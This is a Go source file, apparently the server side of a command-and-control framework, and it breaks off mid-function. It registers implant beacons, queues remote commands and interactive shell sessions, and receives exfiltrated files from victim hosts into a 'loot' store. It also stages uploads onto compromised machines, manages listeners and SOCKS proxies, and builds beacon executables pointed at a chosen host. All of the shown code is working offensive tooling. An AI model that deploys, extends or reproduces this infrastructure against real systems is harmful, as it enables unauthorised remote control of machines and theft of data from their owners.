package server

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"c2/ui"
	"crypto/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"c2/auth"
	"c2/builder"
	"c2/models"
	"c2/protocol"
	"c2/store"
	"golang.org/x/time/rate"
)

type saver interface {
	SaveListeners([]*models.Listener)
	SaveBeacons([]*models.Beacon)
	SaveEvents([]*models.Event)
	SaveTerminals(map[uint32]*models.TerminalState)
	SaveLoot([]*models.ExfilEntry)
	SaveRSAKey(*rsa.PrivateKey)
}

type Handler struct {
	store           *store.Store
	privKey         *rsa.PrivateKey
	beaconSrc       string // empty = build disabled
	lm              listenerStarter
	p               saver
	managementPort  int
	sessionListener *SessionListener
	hub             *Hub
	socksMgr        *SocksManager
	authSvc         *auth.Auth
	jwtKey          []byte
	chatLimitersMu  sync.Mutex
	chatLimiters    map[string]*rate.Limiter
}

func NewHandler(s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, lm listenerStarter, p saver, managementPort int, sl *SessionListener, hub *Hub, socksMgr *SocksManager, authSvc *auth.Auth, jwtKey []byte) *Handler {
	return &Handler{store: s, privKey: privKey, beaconSrc: beaconSrc, lm: lm, p: p, managementPort: managementPort, sessionListener: sl, hub: hub, socksMgr: socksMgr, authSvc: authSvc, jwtKey: jwtKey, chatLimiters: make(map[string]*rate.Limiter)}
}

func (h *Handler) logEvent(evType, msg string) {
	evt := &models.Event{Type: evType, Message: msg, Timestamp: time.Now()}
	h.store.AddEvent(evt)
	h.p.SaveEvents(h.store.ListEvents())
	h.hub.Publish("events", "add", evt)
}

func (h *Handler) HandleLogin(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	if !h.authSvc.ValidatePassword(req.Username, req.Password) {
		http.Error(w, "invalid credentials", http.StatusUnauthorized)
		return
	}
	token, err := auth.SignToken(req.Username, h.jwtKey)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	h.logEvent("auth", fmt.Sprintf("operator '%s' logged in", req.Username))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Token string `json:"token"`
	}{Token: token})
}

func (h *Handler) HandleLogout(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !strings.HasPrefix(token, "Bearer ") {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	raw := token[7:]
	username, err := auth.ValidateToken(raw, h.jwtKey)
	if err != nil {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	auth.RevokeToken(raw, h.jwtKey)
	h.logEvent("auth", fmt.Sprintf("operator '%s' logged out", username))
	w.WriteHeader(http.StatusNoContent)
}

func StartTokenPurge() {
	go func() {
		for {
			time.Sleep(15 * time.Minute)
			auth.PurgeExpiredTokens()
		}
	}()
}

// newBeaconMux returns a mux with only the beacon protocol routes.
// Used by additional (non-management) listeners.
func newBeaconMux(h *Handler) *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/pubkey", h.HandleGetPubKey)
	mux.HandleFunc("POST /api/register", h.HandleRegister)
	mux.HandleFunc("POST /api/checkin", h.HandleCheckin)
	mux.HandleFunc("POST /api/result", h.HandleResult)
	return mux
}

func (h *Handler) HandleGetPubKey(w http.ResponseWriter, r *http.Request) {
	pubDER, err := x509.MarshalPKIXPublicKey(&h.privKey.PublicKey)
	if err != nil {
		http.Error(w, "key marshal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	pem.Encode(w, &pem.Block{Type: "PUBLIC KEY", Bytes: pubDER})
}

func (h *Handler) HandleRegister(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 8*1024))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	plaintext, err := protocol.DecryptMetadata(h.privKey, body)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	meta, err := protocol.DecodeImplantMetadata(plaintext)
	if err != nil {
		http.Error(w, "decode error", http.StatusBadRequest)
		return
	}

	// Capture listener ID from context (injected by middleware)
	if id, ok := r.Context().Value(listenerIDKey).(uint32); ok {
		meta.ListenerID = id
	} else {
		// Default to ID 1 if not through a dynamic listener (management listener)
		meta.ListenerID = 1
	}

	if !h.store.RegisterBeacon(meta) {
		http.Error(w, "duplicate beacon id", http.StatusConflict)
		return
	}
	h.p.SaveBeacons(h.store.ListBeacons())
	beacon := h.store.GetBeacon(meta.ID)
	h.hub.Publish("sessions", "add", map[string]interface{}{
		"id": meta.ID, "hostname": meta.Hostname, "username": meta.Username,
		"process_name": meta.ProcessName, "process_id": meta.ProcessID,
		"arch": meta.Arch, "platform": meta.Platform, "integrity": meta.Integrity,
		"sleep": meta.Sleep, "jitter": meta.Jitter,
		"first_seen": beacon.FirstSeen.Unix(), "last_seen": beacon.LastSeen.Unix(),
		"alive": true, "listener_id": meta.ListenerID, "listener_name": func() string {
			if l := h.store.GetListener(meta.ListenerID); l != nil { return l.Name }
			return "Unknown"
		}(), "mode": "beacon", "shell_active": false,
	})
	h.logEvent("new", fmt.Sprintf("new session #%d %s %s", meta.ID, meta.Hostname, meta.Username))
	w.WriteHeader(http.StatusOK)
}

func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 64))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
	h.p.SaveBeacons(h.store.ListBeacons())

	tasks := h.store.DrainPendingTasks(beaconID)

	var payload []byte
	if len(tasks) == 0 {
		nop := protocol.NewNOP()
		payload = protocol.EncodeHeader(nop.Header)
	} else {
		for _, task := range tasks {
			hdr := protocol.TaskHeader{
				Type:       task.Type,
				Code:       task.Code,
				Flags:      task.Flags,
				Label:      task.Label,
				Identifier: task.Identifier,
				Length:     uint32(len(task.Data)),
			}
			payload = append(payload, append(protocol.EncodeHeader(hdr), task.Data...)...)
		}
	}

	encrypted, err := protocol.Encrypt(beacon.SessionKey, payload)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	if _, err := w.Write(encrypted); err != nil {
		ui.Errorf("checkin", "write: %v", err)
	}

	for _, task := range tasks {
		if task.Type == protocol.TaskSet && task.Code == 0 && len(task.Data) >= 8 {
			interval := binary.LittleEndian.Uint32(task.Data[:4])
			jitter := binary.LittleEndian.Uint32(task.Data[4:8])
			h.store.UpdateBeaconSleep(beaconID, interval, jitter)
			h.hub.Publish("sessions", "update", map[string]interface{}{
				"id": beaconID, "sleep": interval, "jitter": jitter,
			})
			h.store.StoreResult(&models.Result{
				Label:      task.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskSet,
				Output:     fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(task.Label)
			h.p.SaveBeacons(h.store.ListBeacons())
			h.hub.Publish("results", "add", map[string]interface{}{
				"label": task.Label, "beacon_id": beaconID, "output": fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
				"received_at": time.Now().Unix(), "type": protocol.TaskSet,
			})
		}

		if task.Type == protocol.TaskExit {
			h.store.DeleteBeacon(beaconID)
			h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
			h.p.SaveBeacons(h.store.ListBeacons())
		}
	}
}

func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 2*1024*1024))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
	h.p.SaveBeacons(h.store.ListBeacons())

	plaintext, err := protocol.Decrypt(beacon.SessionKey, body[4:])
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	if len(plaintext) < 16 {
		http.Error(w, "payload too short", http.StatusBadRequest)
		return
	}

	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		http.Error(w, "decode header error", http.StatusBadRequest)
		return
	}

	if hdr.Type == protocol.TaskFileExfil {
		done, filename, assembled := h.store.AddExfilFragment(hdr.Label, hdr.Identifier, hdr.Flags, plaintext[16:])
		if done {
			if filename == "" {
				ui.Errorf("exfil", "label=%d completed with empty filename, discarding", hdr.Label)
				w.WriteHeader(http.StatusOK)
				return
			}
			if err := h.saveExfilFile(hdr.Label, filename, assembled); err != nil {
				ui.Errorf("exfil", "save label=%d: %v", hdr.Label, err)
				h.store.StoreResult(&models.Result{
					Label:      hdr.Label,
					BeaconID:   beaconID,
					Type:       protocol.TaskFileExfil,
					Flags:      1, // FLAG_ERROR
					Output:     fmt.Sprintf("disk save failed: %v", err),
					ReceivedAt: time.Now(),
				})
				h.store.MarkTaskDone(hdr.Label)
				w.WriteHeader(http.StatusOK)
				return
			}
			h.store.MarkExfilDone(hdr.Label, filename, beaconID, int64(len(assembled)))
			h.hub.Publish("loot", "add", map[string]interface{}{
				"label": hdr.Label, "filename": filename, "beacon_id": beaconID,
				"size": int64(len(assembled)), "exfil_at": time.Now().Unix(),
			})
			h.logEvent("exfil", fmt.Sprintf("file exfiltrated from #%d: %s (%d bytes)", beaconID, filename, len(assembled)))
			h.store.StoreResult(&models.Result{
				Label:      hdr.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskFileExfil,
				Filename:   filename,
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(hdr.Label)
			h.p.SaveLoot(h.store.ListExfilFiles())
			h.hub.Publish("results", "add", map[string]interface{}{
				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileExfil,
				"filename": filename, "output": "", "received_at": time.Now().Unix(),
			})
		}
	} else if hdr.Type == protocol.TaskFileStage {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.logEvent("upload", fmt.Sprintf("file staged on #%d: %s", beaconID, output))
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", map[string]interface{}{
			"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileStage,
			"flags": hdr.Flags, "output": output, "received_at": time.Now().Unix(),
		})
	} else {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", map[string]interface{}{
			"label": hdr.Label, "beacon_id": beaconID, "flags": hdr.Flags,
			"output": output, "received_at": time.Now().Unix(),
		})
	}

	w.WriteHeader(http.StatusOK)
}

func (h *Handler) saveExfilFile(label uint32, filename string, data []byte) error {
	if err := os.MkdirAll("exfil", 0755); err != nil {
		return err
	}
	path := filepath.Join("exfil", fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
	return os.WriteFile(path, data, 0644)
}

func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID  uint32 `json:"beacon_id"`
		Type      uint8  `json:"type"`
		Code      uint8  `json:"code"`
		Args      string `json:"args"`
		Transport string `json:"transport"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	if h.store.GetBeacon(req.BeaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	var data []byte
	if req.Type == protocol.TaskRun {
		data = protocol.EncodeRunReq(req.Args)
	} else if req.Type == protocol.TaskFileExfil {
		data = append([]byte(req.Args), 0) // null-terminated path for beacon
	} else if req.Type == protocol.TaskSet && req.Code == 0 { // CODE_SET_SLEEP
		// Parse "seconds [jitter]"
		parts := strings.Fields(req.Args)
		var seconds, jitter uint32
		if len(parts) >= 1 {
			v, _ := strconv.ParseUint(parts[0], 10, 32)
			seconds = uint32(v)
		}
		if len(parts) >= 2 {
			v, _ := strconv.ParseUint(parts[1], 10, 32)
			jitter = uint32(v)
		} else {
			jitter = 20 // Default jitter
		}
		data = protocol.EncodeSetSleepReq(seconds, jitter)
	}

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])

	task := &models.Task{
		Label:     label,
		BeaconID:  req.BeaconID,
		Type:      req.Type,
		Code:      req.Code,
		Data:      data,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}

	// TaskShellStart: embed session listener port, send via session TCP if
	// beacon is in session mode, otherwise queue for HTTP checkin.
	if req.Type == protocol.TaskShellStart && h.sessionListener != nil {
		portLE := make([]byte, 2)
		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
		data = portLE
		task.Data = portLE
		if h.store.IsSession(req.BeaconID) {
			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
				Type:   req.Type,
				Code:   req.Code,
				Label:  label,
				Length: uint32(len(data)),
			})
			taskMsg = append(taskMsg, data...)
			if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
				h.store.QueueTask(task)
			} else {
				task.Status = models.TaskStatusSent
				h.store.QueueTask(task)
			}
		} else {
			h.store.QueueTask(task)
		}
	} else if h.sessionListener != nil && (req.Type == protocol.TaskShellInput || req.Type == protocol.TaskShellStop) && h.store.IsShell(req.BeaconID) {
		// Route shell input/stop to the dedicated shell TCP connection
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   req.Type,
			Code:   req.Code,
			Label:  label,
			Length: uint32(len(data)),
		})
		taskMsg = append(taskMsg, data...)
		if err := h.sessionListener.SendShellTask(req.BeaconID, taskMsg); err != nil {
			h.store.QueueTask(task)
		} else {
			task.Status = models.TaskStatusSent
			h.store.QueueTask(task)
		}
	} else if req.Transport != "http" && h.sessionListener != nil && h.store.IsSession(req.BeaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   req.Type,
			Code:   req.Code,
			Label:  label,
			Length: uint32(len(data)),
		})
		taskMsg = append(taskMsg, data...)
		if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
			h.store.QueueTask(task)
		} else {
			task.Status = models.TaskStatusSent
			h.store.QueueTask(task)
			if req.Type == protocol.TaskSet && req.Code == 0 && len(data) >= 8 {
				interval := binary.LittleEndian.Uint32(data[:4])
				jitter := binary.LittleEndian.Uint32(data[4:8])
				h.store.UpdateBeaconSleep(req.BeaconID, interval, jitter)
				h.hub.Publish("sessions", "update", map[string]interface{}{
					"id": req.BeaconID, "sleep": interval, "jitter": jitter,
				})
				h.p.SaveBeacons(h.store.ListBeacons())
			}
		}
	} else {
		h.store.QueueTask(task)
	}

	operator, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("task", fmt.Sprintf("operator '%s' queued task #%d type=%d args=%s", operator, req.BeaconID, req.Type, req.Args))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Label uint32 `json:"label"`
	}{Label: label})
}

func (h *Handler) HandleGetSessions(w http.ResponseWriter, r *http.Request) {
	beacons := h.store.ListBeacons()
	type item struct {
		ID           uint32 `json:"id"`
		Hostname     string `json:"hostname"`
		Username     string `json:"username"`
		ProcessName  string `json:"process_name"`
		ProcessID    uint32 `json:"process_id"`
		Arch         uint8  `json:"arch"`
		Platform     uint8  `json:"platform"`
		Integrity    uint8  `json:"integrity"`
		Sleep        uint32 `json:"sleep"`
		Jitter       uint32 `json:"jitter"`
		FirstSeen    int64  `json:"first_seen"`
		LastSeen     int64  `json:"last_seen"`
		Alive        bool   `json:"alive"`
		ListenerID   uint32 `json:"listener_id"`
		ListenerName string `json:"listener_name"`
		Mode         string `json:"mode"`
		ShellActive  bool   `json:"shell_active"`
		SocksActive  bool   `json:"socks_active"`
		SocksHost    string `json:"socks_host,omitempty"`
		SocksPort    int    `json:"socks_port,omitempty"`
	}
	resp := make([]item, len(beacons))
	for i, b := range beacons {
		lName := "Unknown"
		if l := h.store.GetListener(b.ListenerID); l != nil {
			lName = l.Name
		}
		resp[i] = item{
			ID:           b.ID,
			Hostname:     b.Hostname,
			Username:     b.Username,
			ProcessName:  b.ProcessName,
			ProcessID:    b.ProcessID,
			Arch:         b.Arch,
			Platform:     b.Platform,
			Integrity:    b.Integrity,
			Sleep:        b.Sleep,
			Jitter:       b.Jitter,
			FirstSeen:    b.FirstSeen.Unix(),
			LastSeen:     b.LastSeen.Unix(),
			Alive:        b.IsAlive() || h.store.IsSession(b.ID),
			ListenerID:   b.ListenerID,
			ListenerName: lName,
			Mode: func() string {
				if h.store.IsSession(b.ID) {
					return "session"
				}
				return "beacon"
			}(),
			ShellActive: h.store.IsShell(b.ID),
			SocksActive: h.store.HasSocksProxy(b.ID),
			SocksHost: func() string {
				if p := h.store.GetSocksProxy(b.ID); p != nil {
					return p.Host
				}
				return ""
			}(),
			SocksPort: func() int {
				if p := h.store.GetSocksProxy(b.ID); p != nil {
					return p.Port
				}
				return 0
			}(),
		}
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleGetResults(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	var since int64
	if s := r.URL.Query().Get("since"); s != "" {
		since, _ = strconv.ParseInt(s, 10, 64)
	}

	results := h.store.GetResultsSince(beaconID, since)
	type item struct {
		Label      uint32 `json:"label"`
		BeaconID   uint32 `json:"beacon_id"`
		Flags      uint16 `json:"flags"`
		Type       uint8  `json:"type"`
		Filename   string `json:"filename,omitempty"`
		Output     string `json:"output"`
		ReceivedAt int64  `json:"received_at"`
	}
	resp := make([]item, len(results))
	for i, res := range results {
		resp[i] = item{
			Label:      res.Label,
			BeaconID:   res.BeaconID,
			Flags:      res.Flags,
			Type:       res.Type,
			Filename:   res.Filename,
			Output:     res.Output,
			ReceivedAt: res.ReceivedAt.Unix(),
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
	if h.beaconSrc == "" {
		http.Error(w, "build not configured — start teamserver with -beacon-src <path>", http.StatusNotImplemented)
		return
	}

	var req struct {
		ListenerID  uint32 `json:"listener_id"`
		SleepMS     int    `json:"sleep_ms"`
		JitterPct   int    `json:"jitter_pct"`
		Format      string `json:"format"`
		SessionPort int    `json:"session_port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	l := h.store.GetListener(req.ListenerID)
	if l == nil {
		http.Error(w, "unknown listener_id", http.StatusBadRequest)
		return
	}
	if l.Host == "" {
		http.Error(w, "listener has no public host configured", http.StatusBadRequest)
		return
	}

	data, err := builder.Build(builder.BuildParams{
		ServerHost:       l.Host,
		ServerPort:       l.Port,
		SleepMS:          req.SleepMS,
		JitterPct:        req.JitterPct,
		BeaconSrc:        h.beaconSrc,
		UseHTTPS:         l.Scheme == "https",
		IgnoreCertErrors: l.AutoCert,
		Format:           req.Format,
		SessionPort:      req.SessionPort,
	})
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}

	filename := "beacon.exe"
	if req.Format == "bin" {
		filename = "beacon.bin"
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
	if _, err := w.Write(data); err != nil {
		ui.Errorf("build", "write %s: %v", filename, err)
	}
}

func (h *Handler) HandleListListeners(w http.ResponseWriter, r *http.Request) {
	listeners := h.store.ListListeners()
	type item struct {
		ID            uint32            `json:"id"`
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CustomHeaders map[string]string `json:"custom_headers,omitempty"`
		IsDefault     bool              `json:"is_default"`
		AutoCert      bool              `json:"auto_cert"`
	}
	resp := make([]item, len(listeners))
	for i, l := range listeners {
		resp[i] = item{
			ID:            l.ID,
			Name:          l.Name,
			Scheme:        l.Scheme,
			Host:          l.Host,
			BindAddr:      l.BindAddr,
			Port:          l.Port,
			CustomHeaders: l.CustomHeaders,
			IsDefault:     l.IsDefault,
			AutoCert:      l.AutoCert,
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleCreateListener(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CertPEM       string            `json:"cert_pem"`
		KeyPEM        string            `json:"key_pem"`
		CustomHeaders map[string]string `json:"custom_headers"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}
	if req.Scheme != "http" && req.Scheme != "https" {
		http.Error(w, "scheme must be http or https", http.StatusBadRequest)
		return
	}
	if req.Host == "" {
		http.Error(w, "host required", http.StatusBadRequest)
		return
	}
	if req.Port < 1 || req.Port > 65535 {
		http.Error(w, "port must be 1-65535", http.StatusBadRequest)
		return
	}
	if req.Port == h.managementPort {
		http.Error(w, "port already in use by management server", http.StatusConflict)
		return
	}
	if h.store.PortInUse(req.Port) {
		http.Error(w, "port already in use by another listener", http.StatusConflict)
		return
	}
	if req.CertPEM != "" && req.KeyPEM == "" {
		http.Error(w, "key_pem is required when cert_pem is provided", http.StatusBadRequest)
		return
	}
	bindAddr := req.BindAddr
	if bindAddr == "" {
		bindAddr = "0.0.0.0"
	}

	l := &models.Listener{
		Name:          req.Name,
		Scheme:        req.Scheme,
		Host:          req.Host,
		BindAddr:      bindAddr,
		Port:          req.Port,
		CustomHeaders: req.CustomHeaders,
	}
	if req.CertPEM != "" {
		l.CertPEM = []byte(req.CertPEM)
		l.KeyPEM = []byte(req.KeyPEM)
	}

	h.store.AddListener(l)

	if err := h.lm.Start(l, newBeaconMux(h)); err != nil {
		h.store.RemoveListener(l.ID)
		http.Error(w, "failed to start listener: "+err.Error(), http.StatusInternalServerError)
		return
	}
	h.p.SaveListeners(h.store.ListListeners())
	h.hub.Publish("listeners", "add", map[string]interface{}{
		"id": l.ID, "name": l.Name, "scheme": l.Scheme, "host": l.Host,
		"bind_addr": l.BindAddr, "port": l.Port, "auto_cert": l.AutoCert,
	})
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("listener", fmt.Sprintf("operator '%s' created listener: %s %s://:%d", op, l.Name, l.Scheme, l.Port))

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(struct {
		ID uint32 `json:"id"`
	}{ID: l.ID})
}

func (h *Handler) HandleDeleteListener(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	id := uint32(id64)

	l := h.store.GetListener(id)
	if l == nil {
		http.Error(w, "unknown listener", http.StatusNotFound)
		return
	}
	if l.IsDefault {
		http.Error(w, "cannot delete default listener", http.StatusForbidden)
		return
	}
	if err := h.lm.Stop(id); err != nil {
		http.Error(w, "stop failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("listener", fmt.Sprintf("operator '%s' deleted listener: %s #%d", op, l.Name, id))
	h.store.RemoveListener(id)
	h.hub.Publish("listeners", "delete", map[string]interface{}{"id": id})
	h.p.SaveListeners(h.store.ListListeners())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(256 << 20); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}

	beaconIDStr := r.FormValue("beacon_id")
	destPath := r.FormValue("dest_path")
	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
	if err != nil || destPath == "" {
		http.Error(w, "missing beacon_id or dest_path", http.StatusBadRequest)
		return
	}
	if len(destPath) > 260 {
		http.Error(w, "dest_path exceeds MAX_PATH (260 bytes)", http.StatusBadRequest)
		return
	}
	beaconID := uint32(beaconIDVal)

	if h.store.GetBeacon(beaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "missing file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	const chunkSize = 64 * 1024
	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])
	pathBytes := []byte(destPath)
	pathLen := uint16(len(pathBytes))

	total := len(fileBytes)
	chunkIndex := uint32(0)
	offset := 0

	enqueue := func(chunk []byte, isFirst, isLast bool) {
		var flags uint16 = protocol.FlagFragmented
		if isLast {
			flags = protocol.FlagLastFragment
		}
		var data []byte
		if isFirst {
			data = append(data, byte(pathLen), byte(pathLen>>8))
			data = append(data, pathBytes...)
		}
		data = append(data, chunk...)
		task := &models.Task{
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Code:       0,
			Flags:      flags,
			Label:      label,
			Identifier: chunkIndex,
			Data:       data,
			Status:     models.TaskStatusPending,
		}
		if h.sessionListener != nil && h.store.IsSession(beaconID) {
			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
				Type:       protocol.TaskFileStage,
				Flags:      flags,
				Label:      label,
				Identifier: chunkIndex,
				Length:     uint32(len(data)),
			})
			taskMsg = append(taskMsg, data...)
			if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
				task.Status = models.TaskStatusSent
			}
		}
		h.store.QueueTask(task)
		chunkIndex++
	}

	if total == 0 {
		enqueue(nil, true, true)
	} else {
		for offset < total {
			end := offset + chunkSize
			if end > total {
				end = total
			}
			enqueue(fileBytes[offset:end], offset == 0, end >= total)
			offset = end
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"label":  label,
		"chunks": chunkIndex,
	})
}

func (h *Handler) HandleListFiles(w http.ResponseWriter, r *http.Request) {
	files := h.store.ListExfilFiles()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(files)
}

func (h *Handler) HandleGetFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	diskPath := filepath.Join("exfil", fmt.Sprintf("%d_%s", entry.Label, filepath.Base(entry.Filename)))
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(entry.Filename)))
	http.ServeFile(w, r, diskPath)
}

func (h *Handler) HandleDeleteFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	diskPath := filepath.Join("exfil", fmt.Sprintf("%d_%s", entry.Label, filepath.Base(entry.Filename)))
	if err := os.Remove(diskPath); err != nil && !os.IsNotExist(err) {
		ui.Errorf("loot", "remove %s: %v", diskPath, err)
	}
	h.store.DeleteExfilFile(label)
	h.hub.Publish("loot", "delete", map[string]interface{}{"label": label})
	h.p.SaveLoot(h.store.ListExfilFiles())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleKillBeacon(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	b := h.store.GetBeacon(beaconID)
	if b == nil {
